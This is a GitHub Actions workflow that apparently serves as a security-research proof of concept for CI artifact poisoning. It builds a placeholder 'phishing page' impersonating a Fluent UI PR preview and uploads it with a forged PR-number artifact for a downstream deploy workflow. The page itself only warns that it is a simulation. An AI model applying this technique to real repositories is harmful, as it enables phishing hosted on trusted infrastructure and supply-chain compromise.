name: PR Website Deploy
on:
  pull_request:

jobs:
  build-and-upload:
    if: ${{ github.repository_owner == 'N372unn32' }}
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Create phishing page
        run: |
          mkdir -p website
          cat > website/index.html << 'HTML'
          <!DOCTYPE html>
          <html>
          <head>
            <title>Fluent UI PR Preview</title>
            <style>
              body { font-family: 'Segoe UI', sans-serif; max-width: 800px; margin: 40px auto; padding: 20px; }
              .warning { background: #fff4ce; border: 1px solid #f0c36d; padding: 16px; border-radius: 4px; margin: 20px 0; }
              h1 { color: #0078d4; }
            </style>
          </head>
          <body>
            <h1>Fluent UI - PR Preview</h1>
            <div class="warning">
              <strong>SECURITY SIMULATION</strong><br>
              This page was deployed by an attacker via a poisoned workflow artifact.
              In a real attack, this could be a credential harvesting page hosted on
              Microsoft-controlled infrastructure (*.web.core.windows.net).
              <br><br>
              <em>This is part of a controlled security simulation. No malicious intent.</em>
            </div>
            <p>Deployed at: <script>document.write(new Date().toISOString())</script></p>
          </body>
          </html>
          HTML

      - name: Create PR number artifact
        run: |
          mkdir -p pr-number-dir
          echo "1" > pr-number-dir/pr.txt

      - name: Upload website artifact
        uses: actions/upload-artifact@v4
        with:
          name: pr-website-artifacts
          path: website/

      - name: Upload PR number artifact
        uses: actions/upload-artifact@v4
        with:
          name: pr-number
          path: pr-number-dir/pr.txt